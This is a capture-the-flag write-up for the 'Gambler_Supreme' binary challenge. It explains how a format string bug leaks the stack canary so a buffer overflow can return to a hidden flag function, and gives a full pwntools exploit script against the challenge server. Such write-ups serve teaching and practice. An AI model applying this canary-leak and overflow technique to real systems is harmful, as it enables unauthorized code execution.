# Gambler_Supreme
## Description
This challenge gives you an ELF file and remote server that ask you to guess random strings to get coins. This time, getting coins does not get you the flag.
## Solution
There is now a format string vulnerability in addition to the buffer overflow. We need to use the format string vulnerability to leak the stack canary, then use that in the buffer overflow to return to `get_flag`
## Solve Script
```py
from pwn import *  
context.log_level = "critical"  
flag = p64(0x4015ba)  
r = remote('ctf.b01lers.com', 9201)  
r.recvuntil(b"inclusive): ")  
r.send(b"7\n")  
r.recvuntil(b"letters: ")  
r.send(b"%13$llx\n")  
canary = p64(int(r.recvline()[12:-1].decode(), 16))
r.sendline(b"a" * 40 + canary + b"b" * 8 + flag)  
r.interactive()
```